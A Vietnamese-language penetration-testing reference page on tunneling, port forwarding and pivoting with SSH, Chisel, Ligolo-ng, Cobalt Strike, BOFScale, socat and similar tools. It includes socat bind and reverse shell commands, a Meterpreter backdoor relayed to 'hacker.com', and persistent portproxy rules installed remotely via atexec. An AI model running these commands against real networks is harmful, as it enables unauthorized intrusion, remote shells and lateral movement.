# Tunneling và Port Forwarding

{{#include ../banners/hacktricks-training.md}}

Để đưa dịch vụ HTTP hoặc TCP cục bộ ra công khai thông qua relay công khai, xem [đưa dịch vụ cục bộ ra internet](expose-local-to-the-internet.md). Chương này đề cập đến việc chuyển tiếp và pivot giữa các host.

## Mẹo về Nmap

> [!WARNING]
> Hỗ trợ proxy của Nmap chỉ giới hạn ở các kết nối TCP và không ảnh hưởng đến các lượt quét ping, cổng hoặc phát hiện hệ điều hành. Khi máy quét nằm sau SOCKS proxy, **tắt tính năng phát hiện host** (`-Pn`) và dùng **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Lệnh cuối sử dụng các tùy chọn `-u` và `-i` của Evil-WinRM để xác định tài khoản và host WinRM; cổng WinRM mặc định là 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH có thể chuyển tiếp kết nối X11, các cổng TCP tùy ý và socket miền Unix qua kênh được mã hóa của nó.<sup>[[6]](#references)</sup>

Kết nối đồ họa SSH (X)

`-Y` bật chuyển tiếp X11 đáng tin cậy và `-C` yêu cầu nén dữ liệu được chuyển tiếp.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Mở cổng mới trên SSH Server --> Cổng khác

Chuyển tiếp từ xa (`-R`) lắng nghe trên SSH server và kết nối đến phía cục bộ; địa chỉ bind chỉ định rõ interface nào có thể truy cập trình lắng nghe đó.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Cổng cục bộ --> Máy chủ bị xâm nhập (SSH) --> Third_box:Port

Chuyển tiếp Local (`-L`) lắng nghe trên client và kết nối đến đích từ phía máy chủ SSH.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Cổng cục bộ --> Máy chủ bị xâm nhập (SSH) --> Bất cứ đâu

Chuyển tiếp động (`-D`) tạo một listener SOCKS4/SOCKS5 cục bộ, với các kết nối được mở từ phía từ xa.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop với ProxyJump

`-J`/`ProxyJump` kết nối đến mục tiêu thông qua một hoặc nhiều jump host, được phân tách bằng dấu phẩy. Các tùy chọn forwarding vẫn thuộc về kết nối SSH cuối cùng, vì vậy SOCKS listener bên dưới mở các đích từ `internal-target`, chứ không phải từ bastion đầu tiên. Cách này tránh phải đăng nhập vào jump host rồi khởi chạy một SSH client thứ hai ở đó.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Các tùy chọn dành riêng cho host jump nên được đặt trong `~/.ssh/config`; cấu hình dòng lệnh dành cho máy đích không tự động áp dụng cho các host trung gian.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Cách này hữu ích để nhận reverse shell từ các host nội bộ thông qua DMZ về máy của bạn:

Cài đặt `GatewayPorts` trên server quyết định liệu remote forward có thể bind ra ngoài loopback hay không; giá trị mặc định là `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Ví dụ này sử dụng quyền root để tạo thiết bị tunnel trên cả hai máy chủ. Máy chủ phải cho phép chuyển tiếp tun và tài khoản được chọn phải có quyền truy cập thiết bị tun; `PermitRootLogin yes` là một cách để sử dụng tài khoản `root` trong trường hợp này.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Bật chuyển tiếp ở phía Server

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Thiết lập một route mới ở phía client

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Bảo mật – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 đã bổ sung extension strict-KEX để chống lại cuộc tấn công toàn vẹn ở giai đoạn đầu của quá trình truyền tải của Terrapin. Hãy cập nhật cả hai đầu nếu có thể và làm theo hướng dẫn của nhà cung cấp đối với các triển khai cũ hơn, thay vì cho rằng chỉ riêng phiên bản đã bảo vệ kênh được chuyển tiếp.<sup>[[8]](#references)</sup>

## SSHUTTLE

Bạn có thể **tunnel** toàn bộ **lưu lượng** đến một **mạng con** qua một máy chủ bằng **ssh**.\
Ví dụ: chuyển tiếp toàn bộ lưu lượng đến 10.10.10.0/24

`sshuttle` cung cấp proxy trong suốt qua SSH và hỗ trợ chọn mạng con cũng như chỉ định lệnh SSH tùy chỉnh như minh họa bên dưới.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Kết nối bằng khóa riêng

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

`portfwd` của Metasploit hỗ trợ chuyển tiếp cục bộ và từ xa, trong khi module proxy SOCKS được thiết kế để hoạt động với các tuyến session hoặc `autoroute` và mặc định lắng nghe trên port 1080 trong các ví dụ này.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Port cục bộ --> Host bị xâm nhập (active session) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Một cách khác:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Beacon của Cobalt Strike có thể chuyển tiếp các kết nối SOCKS4a/SOCKS5 qua Beacon; `rportfwd` mở cổng lắng nghe trên máy đã bị xâm nhập, trong khi `rportfwd_local` khởi tạo kết nối đến đích từ client Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Mở một cổng trên Team Server tại các giao diện mạng cần định tuyến lưu lượng qua Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Trong trường hợp này, **port được mở trên host Beacon**, không phải trên Team Server, và traffic được gửi đến Team Server rồi từ đó đến host:port được chỉ định.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Tài liệu hướng dẫn reverse forwarding ghi nhận hành vi sau:<sup>[[14]](#references)</sup>

- Reverse port forward của Beacon được thiết kế để **tunnel traffic đến Team Server, không dùng để relay traffic giữa các máy riêng lẻ**.
- Traffic được **tunnel bên trong traffic C2 của Beacon**, bao gồm cả các liên kết P2P.
- Các port cao thường tránh được hạn chế đối với port đặc quyền, nhưng chính sách của hệ điều hành đích và các listener hiện có vẫn được áp dụng.

### rPort2Port local

> [!WARNING]
> Trong trường hợp này, **port được mở trên host Beacon**, không phải trên Team Server, và **traffic được gửi đến client Cobalt Strike** (không phải Team Server), rồi từ đó đến host:port được chỉ định.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: chuyển tiếp TCP ở userspace không cần tài khoản

Tailcat sử dụng data plane WireGuard/NAT-traversal/DERP của Tailscale mà không cần control plane của Tailscale. Công cụ này không cần tài khoản Tailscale hay quyền quản trị viên, đồng thời không cài đặt host route hoặc thay đổi DNS. Khác với [Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) hoặc [tailnet BOFScale](#bofscale---cdn-fronted-in-process-tailnet) chạy trong tiến trình, máy chủ chia sẻ *địa chỉ tailcat* qua một kênh riêng. Client dùng địa chỉ đó để truy cập một cổng do node từ xa cung cấp.<sup>[[62]](#references)</sup>

Với một dịch vụ TCP đang lắng nghe trên cổng `4444` tại node từ xa, hãy chạy `serve` ở đó rồi chuyển địa chỉ được in ra cho `forward` trên client. Theo mặc định, lệnh thứ hai bind vào `127.0.0.1:18080`, vì vậy một tiến trình cục bộ chỉ hỗ trợ socket TCP thông thường có thể kết nối tới cổng loopback đó, trong khi Tailcat chuyển tiếp lưu lượng đến cổng `4444` ở node từ xa.<sup>[[62]](#references)</sup> Các số cổng này không phải là giá trị đặc biệt của Tailcat.<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

Địa chỉ chứa public key WireGuard của server và, theo mặc định trong các bản phát hành hiện tại, một pre-shared key. Hãy xem đây là thông tin xác thực: server không giới hạn sẽ chấp nhận peer biết địa chỉ này. Địa chỉ tạm thời ngừng hoạt động khi server thoát. Key `default` được lưu sẽ khiến các lần chạy `serve` sau dùng lại địa chỉ ổn định, vì vậy hãy kiểm tra thông báo khởi động và giới hạn client bằng `serve --allow` nếu địa chỉ có thể bị lộ.<sup>[[62]](#references)</sup>

Các kết nối có thể dùng đường truyền UDP trực tiếp hoặc relay DERP. Cách này giúp tránh phải có domain C2 riêng, nhưng không khiến hoạt động mạng biến mất.<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - tailnet trong tiến trình được CDN đứng trước

[BOFScale](https://github.com/NetSPI/BOFscale) chạy một overlay Tailscale đã chỉnh sửa bên trong implant C2 Windows mà không cài TUN driver hoặc service. Ba thành phần của nó gồm một BOF-PE `tailscaled` CGo `c-shared` chạy bất đồng bộ, một BOF-PE C++ nhỏ giao tiếp với local API, và một cầu nối TCP-to-SOCKS5 `socksportfwd` chạy bất đồng bộ.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 và DERP tương thích với CDN

Tailscale thường dùng HTTP upgrade độc quyền cho control channel TS2021 dựa trên Noise và relay DERP. BOFScale giữ nguyên các luồng byte đó nhưng truyền chúng qua WebSocket RFC 6455, dùng `Sec-WebSocket-Protocol: ts2021` hoặc `derp`, để một origin Headscale/DERP do operator kiểm soát có thể đặt sau CDN chỉ chấp nhận WebSocket upgrade tiêu chuẩn. Client đã vá sẽ thử lại TS2021 qua WebSocket sau HTTP `500`, thử lại DERP sau HTTP `426`, và khiến DERP WebSocket dialer tuân theo cấu hình proxy của host; BOF đặt `TS_DEBUG_DERP_WS_CLIENT=1` để bỏ qua lần thử đầu tiên vốn đã biết là thất bại.<sup>[[53]](#references)[[54]](#references)</sup>

CDN và origin proxy phải giữ nguyên WebSocket upgrade cho `/ts2021` và `/derp`, chuyển tiếp `/key` dưới dạng HTTP thông thường, đồng thời tắt timeout đọc/ghi nội bộ vì các phiên relay có thể duy trì mở vô thời hạn. Cấu hình Headscale đi kèm bật `verify_clients`, chỉ công bố DERP map được nhúng của operator, và để `derp.urls` trống nhằm ngăn fallback sang các relay do Tailscale vận hành.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon trong tiến trình và điều khiển qua named pipe

Trừ khi bị ghi đè, entry point của BOF khởi chạy `tailscaled` với `-tun=userspace-networking`, `-state mem:`, và `-no-logs-no-support`, sau đó tạo một pipe có tên UUID. Nó chuyển hướng stdout/stderr của Go qua một OS pipe đến Beacon output API, vì vậy toàn bộ daemon và Go runtime vẫn thường trú nhưng state và log không được ghi vào thư mục Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

Client gọn nhẹ mô phỏng local API HTTP/1.0 của Tailscale qua pipe đó. Nó mở pipe với `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` vì lớp `safesocket` của daemon mạo danh client của pipe, gửi `Tailscale-Cap: 125`, và ánh xạ local API sang các thao tác `up`, `down`, `status`, quảng bá route và shutdown.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Không unload Go BOF-PE được map thủ công sau khi yêu cầu daemon shutdown: các goroutine của runtime và garbage collector vẫn có thể tiếp tục thực thi từ vùng nhớ mà loader đã unmap. Hãy chạy `tailscaled` trong một process dùng một lần và terminate process đó để dọn dẹp hoàn toàn.<sup>[[54]](#references)</sup>

### Chuyển tiếp lưu lượng bắt nguồn từ host qua SOCKS5 userspace

Các kết nối tailnet đi vào và subnet route được quảng bá hoạt động bên trong network stack userspace, nhưng các process thông thường trên host bị xâm nhập không có OS route vào overlay. Vì vậy, `socksportfwd` lắng nghe trên một TCP port hướng về victim, thương lượng SOCKS5 `NO AUTH` với listener `0.0.0.0:1080` của daemon, gửi `CONNECT` đến đích tailnet, rồi chuyển tiếp dữ liệu theo cả hai hướng một cách bất đồng bộ. Khi đích là tên MagicDNS, nó dùng `ATYP_DOMAIN`, nhờ đó `tailscaled` phân giải tên mà không để lộ tên đó cho Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>

Bên dưới là quy trình tối thiểu dành cho operator; cả node operator lẫn implant đều phải dùng binary đã vá vì Tailscale nguyên bản không thể đi qua thiết kế CDN này.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Local forward có thể tách listener xác thực hiển thị bên ngoài khỏi công cụ relay: buộc một máy xác thực tới cổng được bind trên host đã bị xâm nhập, forward lưu lượng qua tailnet tới `ntlmrelayx`, rồi relay tiếp tới AD CS, LDAP, HTTP, SMB hoặc một target tương thích khác. Xem [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) và [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) để biết các bước cụ thể của từng lỗ hổng; BOFScale chỉ đảm nhiệm việc vận chuyển.<sup>[[54]](#references)</sup>

### Phát hiện

Tìm kiếm tổ hợp các dấu hiệu thay vì một chỉ báo đơn lẻ yếu: runtime Go trong một tiến trình vốn thường không dùng Go, pipe UUID có SDDL quá rộng `D:(A;;GA;;;WD)`, SOCKS listener `0.0.0.0:1080` bất thường và các kết nối TLS WebSocket kéo dài tới địa chỉ CDN. Khi kiểm tra TLS, hãy gắn cờ `Sec-WebSocket-Protocol: derp` hoặc `ts2021` nếu tiến trình sở hữu kết nối không phải dịch vụ `tailscaled` được cấp phép. Các rule `bofscale.yar` của repository cung cấp memory signature cho cả ba thành phần BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Project cung cấp các web tunnel endpoint như `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` và `tunnel.php`; hãy upload một endpoint được hỗ trợ trước khi khởi động local proxy.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Bạn có thể tải xuống từ trang releases của [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel truyền lưu lượng TCP/UDP qua HTTP bằng kết nối được bảo vệ bằng SSH; hãy sử dụng các bản dựng client/server tương thích và kiểm tra cú pháp lệnh của bản phát hành đã chọn.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Chuyển tiếp cổng

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) truyền các forward tĩnh hoặc động qua WebSocket, HTTP/2 hoặc WebTransport (HTTP/3 trên QUIC). Các bản build hiện tại hỗ trợ TCP, UDP, Unix socket, stdio, SOCKS5, proxy HTTP và listener transparent proxy trên Linux ở cả chế độ forward lẫn reverse.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Chạy server trên máy attacker và để pivot kết nối ra ngoài bằng `-R`. Theo hướng này, listener SOCKS5 được tạo trên **server**, còn các kết nối được yêu cầu bắt nguồn từ mạng của **client/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Một reverse static forward sử dụng cùng hướng. Ví dụ, lệnh sau đưa `10.10.10.20:445`, có thể truy cập thông qua pivot, ra cổng loopback `8445` trên máy attacker:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Chi tiết về egress và transport

- Thêm `-p http://user:pass@proxy:8080` vào client để đi qua HTTP proxy tường minh. Dùng `socks5h://127.0.0.1:1080` trong các client như `curl` (hoặc bật proxied DNS trong ứng dụng) để các tên nội bộ được phân giải ở phía bên kia tunnel thay vì bị lộ cho local resolver.<sup>[[52]](#references)</sup>
- `wss://` chọn WebSocket được bảo vệ bằng TLS. Client dùng `https://` sẽ chọn HTTP/2, nhưng việc buffering hoặc chuyển đổi sang HTTP/1 của reverse proxy/CDN thường làm hỏng luồng hai chiều; hãy để lộ trực tiếp wstunnel server khi kiểm thử chế độ này.<sup>[[52]](#references)</sup>
- `wts://` chọn WebTransport qua QUIC. Khởi động server với `--enable-webtransport` (hoặc URL listen `wts://`) và cho phép UDP trên cổng đang lắng nghe. Chế độ này không thể đi qua HTTP `CONNECT` proxy thông thường vì proxy đó truyền TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Dự án upstream cảnh báo không nên xem certificate tự ký được nhúng sẵn là biện pháp bảo vệ quyền riêng tư. Nên dùng certificate tùy chỉnh hợp lệ cùng với `--tls-verify-certificate` (hoặc mTLS), chỉ để proxy listener lắng nghe trên loopback trừ khi bạn chủ ý cho phép truy cập từ xa, và tunnel các giao thức vốn đã bảo mật khi cần tính bảo mật.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Tài liệu bắt đầu nhanh của Ligolo-ng hướng dẫn tạo giao diện TUN trên proxy, xác thực fingerprint certificate cho agent và thiết lập route cho mạng được tunnel.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Binding và lắng nghe trên Agent

Ligolo-ng có thể thêm listener trên agent để chuyển tiếp đến một địa chỉ phía proxy, đồng thời có thể định tuyến dải dành riêng `240.0.0.0/4` để truy cập các dịch vụ cục bộ trên agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Các cổng cục bộ của Access Agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot khởi tạo reverse tunnel từ máy nạn nhân và cung cấp một SOCKS4 proxy trên địa chỉ loopback của máy tấn công; README cũng mô tả thông tin xác thực và các tùy chọn hash cho NTLM-proxy.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot qua **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat kết hợp các loại địa chỉ như `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` và `PROXY`; các ví dụ bên dưới kết hợp những endpoint được mô tả trong tài liệu.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port qua socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter thông qua SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Bạn có thể đi qua một **proxy không xác thực** bằng kiểu địa chỉ `PROXY` được socat tài liệu hóa, bằng cách chạy dòng này thay cho dòng cuối cùng trong console của nạn nhân.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Đường hầm Socat SSL

**/bin/sh console**

Tạo chứng chỉ ở cả hai phía: Client và Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Port2Port từ xa

Kết nối cổng SSH cục bộ (22) với cổng 443 trên máy chủ của attacker.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink là công cụ kết nối dòng lệnh của PuTTY, với các tùy chọn SSH forwarding tương tự `ssh`.<sup>[[22]](#references)</sup>

Dùng `-P` viết hoa để chỉ định cổng SSH. `-pw` vẫn được giữ lại để tương thích, nhưng làm lộ mật khẩu trong danh sách tiến trình; nếu có thể, hãy ưu tiên xác thực bằng key hoặc dùng `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Vì binary này sẽ được thực thi trên máy nạn nhân và là SSH client, hãy mở dịch vụ SSH và cổng cho kết nối ngược; ví dụ sau dùng `-R` để chuyển tiếp một cổng có thể truy cập cục bộ đến máy của attacker.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Khi tạo hoặc thay đổi các quy tắc `portproxy` tồn tại lâu dài, hãy sử dụng ngữ cảnh có các quyền mà máy chủ yêu cầu. Microsoft ghi lại các dạng lệnh thêm, hiển thị và xóa `v4tov4` được sử dụng bên dưới.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Triển khai `portproxy` thông qua tác vụ đã lên lịch

Khi có thông tin xác thực quản trị, có thể thực thi Task Scheduler từ xa để cài đặt quy tắc chuyển tiếp native mà không cần tải lên một relay chuyên dụng. Ví dụ: [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) có thể khiến pivot lắng nghe trên TCP/443 và chuyển tiếp kết nối đến dịch vụ SMB nội bộ.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Quy tắc này là persistent, vì vậy hãy liệt kê bằng `netsh interface portproxy show v4tov4` và xóa thủ công sau khi kiểm thử. Hãy nhớ rằng `portproxy` chỉ cung cấp chức năng forwarding; host firewall cũng phải cho phép listening port.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Bạn cần có **quyền truy cập RDP vào hệ thống**.\
Tải xuống:

SocksOverRDP sử dụng Remote Desktop Dynamic Virtual Channels để truyền kết nối SOCKS5 qua một phiên RDP hiện có; plugin client lắng nghe trên `127.0.0.1:1080`, trong khi thành phần server chạy trên RDP target.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Công cụ này sử dụng `Dynamic Virtual Channels` (`DVC`) từ tính năng Remote Desktop Service của Windows. DVC chịu trách nhiệm **tunneling các packet qua kết nối RDP**.
